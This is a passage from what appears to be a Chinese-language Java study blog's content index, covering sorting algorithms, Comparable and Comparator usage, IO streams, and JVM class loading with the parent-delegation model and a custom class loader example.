   <span class="comment">// 如果最大元素不是根节点，则交换根节点和最大元素，并继续调整堆</span></span><br><span class="line">    <span class="keyword">if</span> (largest != i) &#123;</span><br><span class="line">        swap(array, i, largest);</span><br><span class="line">        heapify(array, n, largest);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 辅助方法：交换数组中两个元素的位置</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] array, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp = array[i];</span><br><span class="line">    array[i] = array[j];</span><br><span class="line">    array[j] = temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">radixSort</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 找出最大值确定位数</span></span><br><span class="line">    <span class="keyword">int</span> max = Arrays.stream(arr).max().getAsInt();</span><br><span class="line">    <span class="keyword">int</span> numDigits = (<span class="keyword">int</span>) Math.log10(max) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建桶</span></span><br><span class="line">    <span class="keyword">int</span>[][] buckets = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>][arr.length];</span><br><span class="line">    <span class="keyword">int</span>[] bucketSizes = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据位数进行排序</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> digit = <span class="number">0</span>; digit &lt; numDigits; digit++) &#123;</span><br><span class="line">        <span class="comment">// 分配元素到桶中</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : arr) &#123;</span><br><span class="line">            <span class="keyword">int</span> digitValue = (num / (<span class="keyword">int</span>) Math.pow(<span class="number">10</span>, digit)) % <span class="number">10</span>;</span><br><span class="line">            buckets[digitValue][bucketSizes[digitValue]] = num;</span><br><span class="line">            bucketSizes[digitValue]++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 收集桶中的元素</span></span><br><span class="line">        <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; bucketSizes[i]; j++) &#123;</span><br><span class="line">                arr[index] = buckets[i][j];</span><br><span class="line">                index++;</span><br><span class="line">            &#125;</span><br><span class="line">            bucketSizes[i] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Java已集成好的排序"><a href="#Java已集成好的排序" class="headerlink" title="Java已集成好的排序"></a>Java已集成好的排序</h2><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><blockquote>
<p><code>Arrays.sort()</code>重载了四类方法：<br><code>sort(T[] a)</code>：对指定T型数组按数字升序排序。<br><code>sort(T[] a,int formIndex, int toIndex)</code>：对指定T型数组的指定范围按数字升序排序。<br><code>sort(T[] a, Comparator&lt;? supre T&gt; c)</code>: 根据指定比较器产生的顺序对T型数组进行排序。<br><code>sort(T[] a, int formIndex, int toIndex, Comparator&lt;? supre T&gt; c)</code>: 根据指定比较器产生的顺序对T型数组的指定范围进行排序。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span>[] a=&#123;<span class="number">2</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">8</span>&#125;;</span><br><span class="line">Arrays.sort(a);</span><br></pre></td></tr></table></figure>

<h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Arrays.sort(); 	<span class="comment">// 使用快速排序（Quicksort）或归并排序（Mergesort）算法对数组进行排序。</span></span><br><span class="line">Arrays.parallelSort();	<span class="comment">// 并行版本的Arrays.sort()，利用多核处理器的并行能力提高排序性能。</span></span><br><span class="line">Collections.sort();		<span class="comment">// 使用TimSort算法对集合进行排序，结合了归并排序和插入排序的思想。</span></span><br><span class="line">Arrays.sort(T[] a, Comparator&lt;? <span class="keyword">super</span> T&gt; c);	<span class="comment">// 根据自定义的Comparator规则对数组进行排序。</span></span><br><span class="line">Collections.sort(List&lt;T&gt; list, Comparator&lt;? <span class="keyword">super</span> T&gt; c);	<span class="comment">// 根据自定义的Comparator规则对集合进行排序。</span></span><br></pre></td></tr></table></figure>

<h3 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h3><p><strong>TreeSet</strong>和<strong>TreeMap</strong>默认按照<strong>红黑树</strong>（数据结构）算法排序（通过红黑树来存储元素，并根据元素的自然顺序或者自定义的比较器来进行排序）</p>
<h2 id="自定义比较器"><a href="#自定义比较器" class="headerlink" title="自定义比较器"></a>自定义比较器</h2><p>涉及到 <strong>对象数组</strong>的比较的情况，两种方法处理：</p>
<ol>
<li>继承<strong>comparable</strong>接口，并实现<code>int compareTo(T o);</code>方法</li>
<li>定义一个单独的对象比较器，继承自<strong>Comparator</strong>接口，实现<code>    int compare(T o1, T o2);</code>方法</li>
</ol>
<h3 id="Comparable"><a href="#Comparable" class="headerlink" title="Comparable"></a>Comparable</h3><ol>
<li><p>Comparable是<code>java.lang</code>包中的一个排序接口。</p>
</li>
<li><p>只要一个类实现了这个接口就可以意味着这个类支持排序。</p>
</li>
<li><p>实现了这个类的接口的列表或者数组可以可以使用<strong>Collections.sort</strong>或<strong>Arrays.sort</strong>进行排序。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Comparable</span>&lt;<span class="title">Person</span>&gt;</span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 重新的compareTo方法。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> person 用于指定的比较的对象。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@returns</span> 相等则返回0，大于则返回正数（1），小于则返回负数（-1）。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Person person)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.age - person.age;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 测试 */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建一个Person数组。</span></span><br><span class="line">        Person[] persons = <span class="keyword">new</span> Person[]&#123;<span class="keyword">new</span> Person(<span class="string">&quot;tom&quot;</span>, <span class="number">20</span>), <span class="keyword">new</span> Person(<span class="string">&quot;jack&quot;</span>, <span class="number">12</span>)&#125;;</span><br><span class="line">        <span class="comment">// 排序之前</span></span><br><span class="line">        <span class="keyword">for</span> (Person p : persons) &#123;</span><br><span class="line">            System.out.print(<span class="string">&quot;name:&quot;</span> + p.name + <span class="string">&quot;, age:&quot;</span> + p.age + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Arrays.sort(persons);		<span class="comment">// 测试中借助Arrays按照定义的Comparable接口进行排序</span></span><br><span class="line">        <span class="comment">// 排序之后</span></span><br><span class="line">        <span class="keyword">for</span> (Person p : persons) &#123;</span><br><span class="line">            System.out.print(<span class="string">&quot;name:&quot;</span> + p.name + <span class="string">&quot;, age:&quot;</span> + p.age + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 最终排序结果解释：</span></span><br><span class="line"><span class="comment"> * 根据compareTo结果：</span></span><br><span class="line"><span class="comment"> * 返回 0，即 a-b &lt; 0。说明a小于b，所以两者的顺序是:a, b。</span></span><br><span class="line"><span class="comment"> * 返回 1，即 a-b &gt; 0。说明a大于b，所以两者的顺序是:b, a。</span></span><br><span class="line"><span class="comment"> * 返回-1，即 a-b=0。说明a等于b，所以两个数的顺序是:a, b</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 结论：a-b升序；b-a降序；</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意</strong>：遇到过<strong>整型溢出</strong>，如：[[-2147483646, -2147483645], [2147483646, 2147483647]]，按照0下标升序，发现结果是降序的，代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span>[][] points = &#123;&#123;-<span class="number">2147483646</span>, -<span class="number">2147483645</span>&#125;, &#123;<span class="number">2147483646</span>, <span class="number">2147483647</span>&#125;&#125;;</span><br><span class="line">Arrays.sort(points, (a, b) -&gt; a[<span class="number">0</span>] - b[<span class="number">0</span>]);     <span class="comment">// 目的是升序排序，预期结果：&#123;&#123;-2147483646, -2147483645&#125;, &#123;2147483646, 2147483647&#125;&#125;</span></span><br><span class="line">System.out.println(points);	<span class="comment">// 结果：&#123;&#123;2147483646, 2147483647&#125;, &#123;-2147483646, -2147483645&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>解决方案：使用<code>Integer.compare(a,b)</code>，<code>Integer.compare</code> 会返回正确的比较结果，而不会因为溢出导致错误排序。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span>[][] points = &#123;&#123;-<span class="number">2147483646</span>, -<span class="number">2147483645</span>&#125;, &#123;<span class="number">2147483646</span>, <span class="number">2147483647</span>&#125;&#125;;</span><br><span class="line">Arrays.sort(points, (a, b) -&gt; Integer.compare(a[<span class="number">0</span>], b[<span class="number">0</span>]));</span><br></pre></td></tr></table></figure></blockquote>
</li>
</ol>
<h3 id="Comparator"><a href="#Comparator" class="headerlink" title="Comparator"></a>Comparator</h3><ol>
<li><p>Comparator是java.util中的一个比较的接口。</p>
</li>
<li><p>如果我们想要控制某个类的次序，而这个类并没有继承Comparable接口，那么我们就可以使用Comparator接口。</p>
</li>
<li><p>比较的规则：大致和上面的规则相同，不过也有不同的地方，详情请看下面的代码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用法一：不重新创建一个类</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Comparator&lt;Integer&gt; comparator = <span class="keyword">new</span> Comparator&lt;&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Integer o1, Integer o2)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    Integer[] a = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">9</span>&#125;;</span><br><span class="line">    Arrays.sort(a, comparator);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用法二：重新创建类，实现Comparator类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonComparator</span> <span class="keyword">implements</span> <span class="title">Comparator</span>&lt;<span class="title">Person</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Person p1, Person p2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> p1.age - p2.age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建一个Person数组。</span></span><br><span class="line">        Person[] persons = <span class="keyword">new</span> Person[]&#123;<span class="keyword">new</span> Person(<span class="string">&quot;tom&quot;</span>, <span class="number">20</span>), <span class="keyword">new</span> Person(<span class="string">&quot;jack&quot;</span>, <span class="number">12</span>)&#125;;</span><br><span class="line">        <span class="comment">// 排序之后</span></span><br><span class="line">        Arrays.sort(persons, <span class="keyword">new</span> PersonComparator());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用法三：使用封装好的工具类Collections</span></span><br><span class="line"><span class="comment">// 降序排序</span></span><br><span class="line">Arrays.sort(integerArray, Collections.reverseOrder());	</span><br><span class="line"><span class="comment">// Collections.reverseOrder()方法返回一个Comparator，该比较器会对元素进行自然顺序的逆序比较。</span></span><br></pre></td></tr></table></figure></li>
<li><p>注意：<strong>比较器的泛型类型 和 被比较列表 的数据类型保持一致</strong></p>
</li>
<li><p><strong>常见报错</strong>：</p>
<blockquote>
<p><code>reason: no instance(s) of type variable(s) T exist so that int[] conforms to T[]</code></p>
<p><strong>解释：</strong>Java 的 <code>Comparator</code> 和 <code>Arrays.sort</code> 是为对象数组设计的。如 <code>Integer[]</code>。因为基本类型数组 <code>int[]</code> 和对象类型数组 <code>Integer[]</code> 是不兼容的，所以你需要将 <code>int[]</code> 转换为 <code>Integer[]</code>。</p>
</blockquote>
</li>
</ol>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
<li>两者不在一个包。Comparable在java.lang中，而Comparator在java.util包中。</li>
<li>实现Comparable的类通常是一个我们要经常使用的类。比如：java中的String类等等。需要修改源代码。而Comparator可以在不同修改源代码的情况下，来完成比较。从了保护了代码。</li>
<li>两个方法各有优劣。如果你的类需要经常使用比较的操作，那么可以考虑让这个了实现Comparable接口。如果你偶尔使用比较的操作，那么可以考虑使用Comparator。</li>
</ol>
]]></content>
      <tags>
        <tag>Java基础</tag>
      </tags>
  </entry>
  <entry>
    <title>java中的IO流使用</title>
    <url>/2021/09/07/java%E4%B8%AD%E7%9A%84IO%E6%B5%81%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="IO流体系"><a href="#IO流体系" class="headerlink" title="IO流体系"></a>IO流体系</h2><span id="more"></span>

<h3 id="常用API"><a href="#常用API" class="headerlink" title="常用API"></a>常用API</h3><p><img src="https://i.loli.net/2021/11/01/SegF6hJp2XWVUtK.jpg" alt="img"></p>
<h3 id="完整API体系"><a href="#完整API体系" class="headerlink" title="完整API体系"></a>完整API体系</h3><p>序列化时，还学习到了<strong>ByteArrayOutputStream流</strong> </p>
<p><strong>ByteArrayOutputStream 对byte类型数据进行写入的类 相当于一个中间缓冲层，将类写入到文件等其他outputStream。它是对字节进行操作，属于内存操作流</strong></p>
<p><img src="https://i.loli.net/2021/11/01/nRey7Ogr1PI8Hql.jpg" alt="img"></p>
<p><img src="https://i.loli.net/2021/11/01/OeoYDKUvqTIgyV4.jpg" alt="img"></p>
<h2 id="从控制台读取输入流（三种方法）"><a href="#从控制台读取输入流（三种方法）" class="headerlink" title="从控制台读取输入流（三种方法）"></a>从控制台读取输入流（三种方法）</h2><p><img src="https://i.loli.net/2021/11/01/4GPOydoXVN5cqiJ.jpg" alt="img"></p>
]]></content>
      <tags>
        <tag>Java基础</tag>
        <tag>IO流</tag>
      </tags>
  </entry>
  <entry>
    <title>java内存分析（1）——类加载的内存分析</title>
    <url>/2021/08/19/java%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90%EF%BC%881%EF%BC%89%E2%80%94%E2%80%94%E7%B1%BB%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="java文件如何被运行"><a href="#java文件如何被运行" class="headerlink" title="java文件如何被运行"></a>java文件如何被运行</h2><span id="more"></span>

<p>先通过编译，将.java文件编译成.class文件，然后让类加载器加载到方法区中去</p>
<p><img src="https://i.loli.net/2021/08/19/9RlL2opHSE6uIQV.png" alt="image-20210819111135267"></p>
<h2 id="类加载的内存分析"><a href="#类加载的内存分析" class="headerlink" title="类加载的内存分析"></a>类加载的内存分析</h2><h3 id="JVM内存结构"><a href="#JVM内存结构" class="headerlink" title="JVM内存结构"></a>JVM内存结构</h3><p><strong>方法区：</strong></p>
<ul>
<li>用于存放类似于元数据信息方面的，比如类信息，<strong>常量</strong>，<strong>静态变量</strong>，编译后代码……</li>
<li>类加载器将**.class文件**搬过来就是先丢到这一块上</li>
</ul>
<p><strong>堆：</strong></p>
<ul>
<li>主要存放了一些存储的数据，比如<strong>对象实例（包括class对象实例）</strong>，<strong>数组</strong>等</li>
<li>它和方法区都属于<strong>线程共享区域</strong>，也就是说它们的线程不安全</li>
</ul>
<p><strong>栈：</strong></p>
<ul>
<li>这是我们的代码运行空间。我们编写的<strong>每一个方法</strong>都会放到栈里面运行</li>
<li>线程独享</li>
</ul>
<h2 id="类加载器的流程"><a href="#类加载器的流程" class="headerlink" title="类加载器的流程"></a>类加载器的流程</h2><p><strong>加载</strong>：</p>
<ol>
<li>将.class文件加载到内存</li>
<li>将静态数据结构转换为<strong>方法区中</strong>运行时的数据结构</li>
<li>在堆中生成一个代表这个类的java.lang.Class对象作为数据访问的入口</li>
</ol>
<p><strong>链接</strong>：</p>
<ol>
<li>验证：确保加载的类符合JVM规范和安全，保证被校验类的方法在运行时不会做出危害虚拟机的事件，其实是一个安全检查</li>
<li>准备：为<strong>static变量</strong>在<strong>方法区</strong>中分配内存空间，设置变量的初始值</li>
<li>解析：虚拟机将常量吃内的符号引用替换为直接引用的过程</li>
</ol>
<p><strong>初始化</strong>：</p>
<ol>
<li>执行类构造器<clinit>()方法。类构造器方法是由编译期自动收集类中所有的类变量的赋值动作和静态代码块中的语句合并产生的。</li>
</ol>
<h2 id="分析类的初始化"><a href="#分析类的初始化" class="headerlink" title="分析类的初始化"></a>分析类的初始化</h2><h3 id="什么时候会发生类初始化？"><a href="#什么时候会发生类初始化？" class="headerlink" title="什么时候会发生类初始化？"></a>什么时候会发生类初始化？</h3><ol>
<li><strong>类的主动引用（一定会发生类的初始化）</strong><ul>
<li>当虚拟机启动，先初始化main方法所在的类</li>
<li>new一个类的对象</li>
<li>调用类的静态成员（除了final常量）和静态方法</li>
<li>使用java.lang.reflect包的方法对类进行反射调用</li>
<li>当初始化一个类，如果其父类没有被初始化，则会先初始化他的父类</li>
</ul>
</li>
<li><strong>类的被动引用（不会发生类的初始化）</strong><ul>
<li>当访问一个静态域时，只有真正声明这个域的类才会被初始化。如当通过子类引用父类的静态变量，不会导至子类初始化</li>
<li>通过数组定义类引用，不会触发此类的初始化</li>
<li>引用常量不会出发此类的初始化（常量在链接阶段就存入调用类的常量池中了）</li>
</ul>
</li>
</ol>
<h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><h3 id="类加载的作用："><a href="#类加载的作用：" class="headerlink" title="类加载的作用："></a>类加载的作用：</h3><p>将class文件字节码内容<strong>加载到内存中</strong>，并将这些静态数据转换成方法区的运行时数据结构，然后<strong>在堆中生成一个代表这个类的java.lang.Class对象，作为方法区中类数据的访问入口（注意：入口在堆中）</strong></p>
<h3 id="类加载器的加载顺序"><a href="#类加载器的加载顺序" class="headerlink" title="类加载器的加载顺序"></a>类加载器的加载顺序</h3><p>加载一个Class类的顺序也是有优先级的，类加载器从最底层开始往上的顺序是这样的</p>
<p><img src="https://i.loli.net/2021/08/19/eto8ap2DY1nkAJj.png" alt="这里写图片描述"></p>
<ol>
<li><p>BootstrapClassLoader（启动类加载器） </p>
<p>负责加载<code>$JAVA_HOME中jre/lib/rt.jar</code>里所有的class，加载<code>System.getProperty(“sun.boot.class.path”)</code>所指定的路径或jar</p>
</li>
<li><p>ExtensionClassLoader（标准扩展类加载器） </p>
<p>负责加载java平台中扩展功能的一些jar包，包括<code>$JAVA_HOME中jre/lib/*.jar</code>或<code>-Djava.ext.dirs</code>指定目录下的jar包。载<code>System.getProperty(“java.ext.dirs”)</code>所指定的路径或jar。 </p>
</li>
<li><p>AppClassLoader（系统类加载器） </p>
<p>负责记载<code>classpath</code>中指定的jar包及目录中class </p>
</li>
<li><p>CustomClassLoader（自定义加载器） </p>
<p>属于应用程序根据自身需要自定义的ClassLoader，如tomcat、jboss都会根据j2ee规范自行实现。</p>
</li>
</ol>
<h3 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h3><p>当一个类收到了加载请求时，它是不会先自己去尝试加载的，而是委派给父类去完成。</p>
<p>只有当父类加载器范阔自己无法完成这个请求（也就是父类加载器都没找到加载所需的Class）时，子类加载器才会自行尝试加载</p>
<p><strong>好处：</strong>加载位于rt.jar包中的类时不管是那个加载器加载，最终都会委托到BootStrap ClassLoader进行加载，这样保证了使用不同的类加载器得到的都是同一个结果。</p>
<p>其实这是一个隔离的作用，避免了我们的代码影响了JDK的代码。</p>
<p><strong>缺点：</strong></p>
<ul>
<li>灵活性降低：由于类加载的过程需要不断地委托给父类加载器，这种机制可能导致实际应用中类加载的灵活性降低。</li>
<li>增加了类加载时间：在类加载的过程中，需要不断地查询并委托父类加载器，这意味着类加载所需要的时间可能会增加。在类数量庞大或类加载器层次比较深的情况下，这种时间延迟可能会变得更加明显。</li>
</ul>
<h3 id="打破双亲委派机制"><a href="#打破双亲委派机制" class="headerlink" title="打破双亲委派机制"></a>打破双亲委派机制</h3><p>在一些实际应用场景中，需要打破这个机制，实现更加灵活的类加载</p>
<ul>
<li><p><strong>OSGi（Open Service Gateway Initiative）</strong>：OSGi 是一个模块化系统和服务平台，提供了一个强大的类加载器模型。在 OSGi 中，每个模块都有一个独立的类加载器，可以按需加载来自不同模块的类。这有助于解决 JAR 地狱问题，提高模块化和动态更新能力。</p>
</li>
<li><p><strong>Tomcat Web容器</strong>：Tomcat 的 Web 应用类加载器可以加载 Web 应用程序中的本地类库，从而使得每个 Web 应用程序可以使用各自的版本的类库。这些 Web 应用的类加载器都是${tomcat-home}/lib 中类库的子类加载器。</p>
</li>
<li><p><strong>Java Agent</strong>: Java Agent 是一种基于 Java Instrumentation API 的技术，它可以在运行时修改已加载的类的字节码，从而实现类的热替换、AOP（面向切面编程）等功能。这种技术在诸如热部署、性能监控和分布式追踪等场景中有广泛应用。</p>
</li>
<li><p><strong>JDK 中的 URLClassLoader</strong>：JDK 自带的 URLClassLoader 可以用来加载指定 URL 路径下的类。实际上，它实现了一种子类优先的策略，先尝试加载自身路径下的类，再委托给父类加载器，从而打破了双亲委派机制。</p>
</li>
</ul>
<p>示例代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CustomClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 自定义类加载器必须提供一个加载类文件的位置</span></span><br><span class="line">    <span class="keyword">private</span> String classesPath;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CustomClassLoader</span><span class="params">(String classesPath, ClassLoader parent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(parent);</span><br><span class="line">        <span class="keyword">this</span>.classesPath = classesPath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="keyword">boolean</span> resolve) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">//首先,检查已加载的类</span></span><br><span class="line">        Class&lt;?&gt; loadedClass = findLoadedClass(name);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (loadedClass == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果已加载类中没有该类, 尝试用自定义的方法加载</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                loadedClass = findClassInPath(name);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="comment">// 如果自定义加载方法找不到类,则委托给父类加载器</span></span><br><span class="line">                loadedClass = <span class="keyword">super</span>.loadClass(name, resolve);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">            resolveClass(loadedClass);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> loadedClass;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Class&lt;?&gt; findClassInPath(String className) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String filePath = className.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line">            <span class="keyword">byte</span>[] classBytes = Files.readAllBytes(Paths.get(classesPath, filePath));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> defineClass(className, classBytes, <span class="number">0</span>, classBytes.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(<span class="string">&quot;Class not found in classes path: &quot;</span> + className, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String pathToClasses = <span class="string">&quot;/path/to/your/classes&quot;</span>;</span><br><span class="line">        String className = <span class="string">&quot;com.example.SampleClass&quot;</span>;</span><br><span class="line">        String methodName = <span class="string">&quot;sampleMethod&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建自定义类加载器实例，将类的加载权交给它</span></span><br><span class="line">        CustomClassLoader customClassLoader = <span class="keyword">new</span> CustomClassLoader(pathToClasses, CustomClassLoader.class.getClassLoader());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用自定义类加载器加载类</span></span><br><span class="line">        Class&lt;?&gt; customClass = customClassLoader.loadClass(className);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建类的实例并调用方法</span></span><br><span class="line">        Object obj = customClass.newInstance();</span><br><span class="line">        Method method = customClass.getDeclaredMethod(methodName);</span><br><span class="line">        method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        method.invoke(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="类缓存"><a href="#类缓存" class="headerlink" title="类缓存"></a>类缓存</h3><p>某一个类被类加载器加载到内存中，维持加载（缓存）一段时间。不过JVM垃圾回收机制可以回收这些Class对象</p>
<blockquote>
<p><a href="https://www.cnblogs.com/max-home/p/12270183.html">参考文章：大白话带你认识JVM(转) - 壹袋米 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://blog.csdn.net/weixin_45716968/article/details/132543500">参考文章：深入了解双亲委派机制（常说的类加载机制）-CSDN博客</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>JVM内存分析</tag>
        <tag>双亲委派机制</tag>
      </tags>
  </entry>
  <entry>
    <title>java内存分析（3）——java的常量池的理解</title>
    <url>/2021/10/23/java%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90%EF%BC%883%EF%BC%89%E2%80%94%E2%80%94java%E7%9A%84%E5%B8%B8%E9%87%8F%E6%B1%A0%E7%9A%84%E7%90%86%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="java执行类的阶段划分"><a href="#java执行类的阶段划分" class="headerlink" title="java执行类的阶段划分"></a>java执行类的阶段划分</h2><span id="more"></span>

